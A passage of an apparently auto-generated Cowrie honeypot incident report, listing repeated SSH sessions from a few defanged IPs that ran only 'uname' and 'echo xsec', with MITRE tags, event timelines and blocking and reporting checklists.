- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b34d741df43

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:51` | `cowrie.session.connect` |
| `2026-08-16 18:40:51` | `cowrie.client.version` |
| `2026-08-16 18:40:51` | `cowrie.client.kex` |
| `2026-08-16 18:40:52` | `cowrie.login.success` |
| `2026-08-16 18:40:53` | `cowrie.session.params` |
| `2026-08-16 18:40:53` | `cowrie.command.input` |
| `2026-08-16 18:40:53` | `cowrie.log.closed` |
| `2026-08-16 18:40:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c82ad172558

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:57` | `cowrie.session.connect` |
| `2026-08-16 18:40:57` | `cowrie.client.version` |
| `2026-08-16 18:40:57` | `cowrie.client.kex` |
| `2026-08-16 18:40:58` | `cowrie.login.success` |
| `2026-08-16 18:40:58` | `cowrie.session.params` |
| `2026-08-16 18:40:58` | `cowrie.command.input` |
| `2026-08-16 18:40:59` | `cowrie.log.closed` |
| `2026-08-16 18:40:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f481524f5322

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:41 |
| **Last Seen** | 2026-08-16 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:41:03` | `cowrie.session.connect` |
| `2026-08-16 18:41:03` | `cowrie.client.version` |
| `2026-08-16 18:41:03` | `cowrie.client.kex` |
| `2026-08-16 18:41:03` | `cowrie.login.success` |
| `2026-08-16 18:41:04` | `cowrie.session.params` |
| `2026-08-16 18:41:04` | `cowrie.command.input` |
| `2026-08-16 18:41:04` | `cowrie.log.closed` |
| `2026-08-16 18:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4858379cba3

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:41 |
| **Last Seen** | 2026-08-16 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:41:08` | `cowrie.session.connect` |
| `2026-08-16 18:41:08` | `cowrie.client.version` |
| `2026-08-16 18:41:08` | `cowrie.client.kex` |
| `2026-08-16 18:41:08` | `cowrie.login.success` |
| `2026-08-16 18:41:09` | `cowrie.session.params` |
| `2026-08-16 18:41:09` | `cowrie.command.input` |
| `2026-08-16 18:41:09` | `cowrie.log.closed` |
| `2026-08-16 18:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-097928e96980

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:41 |
| **Last Seen** | 2026-08-16 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:41:13` | `cowrie.session.connect` |
| `2026-08-16 18:41:13` | `cowrie.client.version` |
| `2026-08-16 18:41:13` | `cowrie.client.kex` |
| `2026-08-16 18:41:13` | `cowrie.login.success` |
| `2026-08-16 18:41:14` | `cowrie.session.params` |
| `2026-08-16 18:41:14` | `cowrie.command.input` |
| `2026-08-16 18:41:14` | `cowrie.log.closed` |
| `2026-08-16 18:41:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2def6f4a5b2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:41 |
| **Last Seen** | 2026-08-16 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:41:18` | `cowrie.session.connect` |
| `2026-08-16 18:41:18` | `cowrie.client.version` |
| `2026-08-16 18:41:18` | `cowrie.client.kex` |
| `2026-08-16 18:41:19` | `cowrie.login.success` |
| `2026-08-16 18:41:20` | `cowrie.session.params` |
| `2026-08-16 18:41:20` | `cowrie.command.input` |
| `2026-08-16 18:41:20` | `cowrie.log.closed` |
| `2026-08-16 18:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b564d6df338

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:41 |
| **Last Seen** | 2026-08-16 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:41:24` | `cowrie.session.connect` |
| `2026-08-16 18:41:24` | `cowrie.client.version` |
| `2026-08-16 18:41:24` | `cowrie.client.kex` |
| `2026-08-16 18:41:24` | `cowrie.login.success` |
| `2026-08-16 18:41:25` | `cowrie.session.params` |
| `2026-08-16 18:41:25` | `cowrie.command.input` |
| `2026-08-16 18:41:25` | `cowrie.log.closed` |
| `2026-08-16 18:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c60a332c3f0

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:41 |
| **Last Seen** | 2026-08-16 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:41:29` | `cowrie.session.connect` |
| `2026-08-16 18:41:29` | `cowrie.client.version` |
| `2026-08-16 18:41:29` | `cowrie.client.kex` |
| `2026-08-16 18:41:30` | `cowrie.login.success` |
| `2026-08-16 18:41:30` | `cowrie.session.params` |
| `2026-08-16 18:41:30` | `cowrie.command.input` |
| `2026-08-16 18:41:30` | `cowrie.log.closed` |
| `2026-08-16 18:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a2147148f3

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:41 |
| **Last Seen** | 2026-08-16 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:41:34` | `cowrie.session.connect` |
| `2026-08-16 18:41:34` | `cowrie.client.version` |
| `2026-08-16 18:41:34` | `cowrie.client.kex` |
| `2026-08-16 18:41:35` | `cowrie.login.success` |
| `2026-08-16 18:41:36` | `cowrie.session.params` |
| `2026-08-16 18:41:36` | `cowrie.command.input` |
| `2026-08-16 18:41:36` | `cowrie.log.closed` |
| `2026-08-16 18:41:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d945c020d809

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:41 |
| **Last Seen** | 2026-08-16 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:41:40` | `cowrie.session.connect` |
| `2026-08-16 18:41:40` | `cowrie.client.version` |
| `2026-08-16 18:41:40` | `cowrie.client.kex` |
| `2026-08-16 18:41:40` | `cowrie.login.success` |
| `2026-08-16 18:41:41` | `cowrie.session.params` |
| `2026-08-16 18:41:41` | `cowrie.command.input` |
| `2026-08-16 18:41:41` | `cowrie.log.closed` |
| `2026-08-16 18:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed31962d6cec

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:41 |
| **Last Seen** | 2026-08-16 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:41:45` | `cowrie.session.connect` |
| `2026-08-16 18:41:45` | `cowrie.client.version` |
| `2026-08-16 18:41:45` | `cowrie.client.kex` |
| `2026-08-16 18:41:45` | `cowrie.login.success` |
| `2026-08-16 18:41:46` | `cowrie.session.params` |
| `2026-08-16 18:41:46` | `cowrie.command.input` |
| `2026-08-16 18:41:46` | `cowrie.log.closed` |
| `2026-08-16 18:41:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33aef3918605

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:41 |
| **Last Seen** | 2026-08-16 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:41:50` | `cowrie.session.connect` |
| `2026-08-16 18:41:50` | `cowrie.client.version` |
| `2026-08-16 18:41:50` | `cowrie.client.kex` |
| `2026-08-16 18:41:51` | `cowrie.login.success` |
| `2026-08-16 18:41:51` | `cowrie.session.params` |
| `2026-08-16 18:41:51` | `cowrie.command.input` |
| `2026-08-16 18:41:52` | `cowrie.log.closed` |
| `2026-08-16 18:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa0a50604da5

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:41 |
| **Last Seen** | 2026-08-16 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:41:56` | `cowrie.session.connect` |
| `2026-08-16 18:41:56` | `cowrie.client.version` |
| `2026-08-16 18:41:56` | `cowrie.client.kex` |
| `2026-08-16 18:41:56` | `cowrie.login.success` |
| `2026-08-16 18:41:57` | `cowrie.session.params` |
| `2026-08-16 18:41:57` | `cowrie.command.input` |
| `2026-08-16 18:41:57` | `cowrie.log.closed` |
| `2026-08-16 18:41:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31ad839f80d8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:01` | `cowrie.session.connect` |
| `2026-08-16 18:42:01` | `cowrie.client.version` |
| `2026-08-16 18:42:01` | `cowrie.client.kex` |
| `2026-08-16 18:42:01` | `cowrie.login.success` |
| `2026-08-16 18:42:02` | `cowrie.session.params` |
| `2026-08-16 18:42:02` | `cowrie.command.input` |
| `2026-08-16 18:42:02` | `cowrie.log.closed` |
| `2026-08-16 18:42:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4720f1776369

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:06` | `cowrie.session.connect` |
| `2026-08-16 18:42:06` | `cowrie.client.version` |
| `2026-08-16 18:42:06` | `cowrie.client.kex` |
| `2026-08-16 18:42:06` | `cowrie.login.success` |
| `2026-08-16 18:42:07` | `cowrie.session.params` |
| `2026-08-16 18:42:07` | `cowrie.command.input` |
| `2026-08-16 18:42:07` | `cowrie.log.closed` |
| `2026-08-16 18:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64d19b9de946

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:06` | `cowrie.session.connect` |
| `2026-08-16 18:42:06` | `cowrie.client.version` |
| `2026-08-16 18:42:26` | `cowrie.client.kex` |
| `2026-08-16 18:42:27` | `cowrie.login.success` |
| `2026-08-16 18:42:27` | `cowrie.session.params` |
| `2026-08-16 18:42:27` | `cowrie.command.input` |
| `2026-08-16 18:42:28` | `cowrie.log.closed` |
| `2026-08-16 18:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0f87e0e6f61

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:11` | `cowrie.session.connect` |
| `2026-08-16 18:42:11` | `cowrie.client.version` |
| `2026-08-16 18:42:11` | `cowrie.client.kex` |
| `2026-08-16 18:42:12` | `cowrie.login.success` |
| `2026-08-16 18:42:12` | `cowrie.session.params` |
| `2026-08-16 18:42:12` | `cowrie.command.input` |
| `2026-08-16 18:42:13` | `cowrie.log.closed` |
| `2026-08-16 18:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7088792d7842

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:17` | `cowrie.session.connect` |
| `2026-08-16 18:42:17` | `cowrie.client.version` |
| `2026-08-16 18:42:17` | `cowrie.client.kex` |
| `2026-08-16 18:42:17` | `cowrie.login.success` |
| `2026-08-16 18:42:18` | `cowrie.session.params` |
| `2026-08-16 18:42:18` | `cowrie.command.input` |
| `2026-08-16 18:42:18` | `cowrie.log.closed` |
| `2026-08-16 18:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f6199ec4f6b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:22` | `cowrie.session.connect` |
| `2026-08-16 18:42:22` | `cowrie.client.version` |
| `2026-08-16 18:42:22` | `cowrie.client.kex` |
| `2026-08-16 18:42:22` | `cowrie.login.success` |
| `2026-08-16 18:42:23` | `cowrie.session.params` |
| `2026-08-16 18:42:23` | `cowrie.command.input` |
| `2026-08-16 18:42:23` | `cowrie.log.closed` |
| `2026-08-16 18:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2fa96e0153e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:27` | `cowrie.session.connect` |
| `2026-08-16 18:42:27` | `cowrie.client.version` |
| `2026-08-16 18:42:28` | `cowrie.client.kex` |
| `2026-08-16 18:42:28` | `cowrie.login.success` |
| `2026-08-16 18:42:29` | `cowrie.session.params` |
| `2026-08-16 18:42:29` | `cowrie.command.input` |
| `2026-08-16 18:42:29` | `cowrie.log.closed` |
| `2026-08-16 18:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1eaefd88aa5

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:33` | `cowrie.session.connect` |
| `2026-08-16 18:42:33` | `cowrie.client.version` |
| `2026-08-16 18:42:33` | `cowrie.client.kex` |
| `2026-08-16 18:42:33` | `cowrie.login.success` |
| `2026-08-16 18:42:34` | `cowrie.session.params` |
| `2026-08-16 18:42:34` | `cowrie.command.input` |
| `2026-08-16 18:42:34` | `cowrie.log.closed` |
| `2026-08-16 18:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98175df08061

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:37` | `cowrie.session.connect` |
| `2026-08-16 18:42:37` | `cowrie.client.version` |
| `2026-08-16 18:42:37` | `cowrie.client.kex` |
| `2026-08-16 18:42:37` | `cowrie.login.success` |
| `2026-08-16 18:42:38` | `cowrie.session.params` |
| `2026-08-16 18:42:38` | `cowrie.command.input` |
| `2026-08-16 18:42:38` | `cowrie.log.closed` |
| `2026-08-16 18:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-107aab037f58

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:38` | `cowrie.session.connect` |
| `2026-08-16 18:42:38` | `cowrie.client.version` |
| `2026-08-16 18:42:38` | `cowrie.client.kex` |
| `2026-08-16 18:42:38` | `cowrie.login.success` |
| `2026-08-16 18:42:39` | `cowrie.session.params` |
| `2026-08-16 18:42:39` | `cowrie.command.input` |
| `2026-08-16 18:42:39` | `cowrie.log.closed` |
| `2026-08-16 18:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8227569d9076

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:43` | `cowrie.session.connect` |
| `2026-08-16 18:42:43` | `cowrie.client.version` |
| `2026-08-16 18:42:43` | `cowrie.client.kex` |
| `2026-08-16 18:42:44` | `cowrie.login.success` |
| `2026-08-16 18:42:44` | `cowrie.session.params` |
| `2026-08-16 18:42:44` | `cowrie.command.input` |
| `2026-08-16 18:42:44` | `cowrie.log.closed` |
| `2026-08-16 18:42:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd71917b6a28

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:48` | `cowrie.session.connect` |
| `2026-08-16 18:42:48` | `cowrie.client.version` |
| `2026-08-16 18:42:48` | `cowrie.client.kex` |
| `2026-08-16 18:42:49` | `cowrie.login.success` |
| `2026-08-16 18:42:50` | `cowrie.session.params` |
| `2026-08-16 18:42:50` | `cowrie.command.input` |
| `2026-08-16 18:42:50` | `cowrie.log.closed` |
| `2026-08-16 18:42:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fe2ccc2339c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:53` | `cowrie.session.connect` |
| `2026-08-16 18:42:53` | `cowrie.client.version` |
| `2026-08-16 18:42:53` | `cowrie.client.kex` |
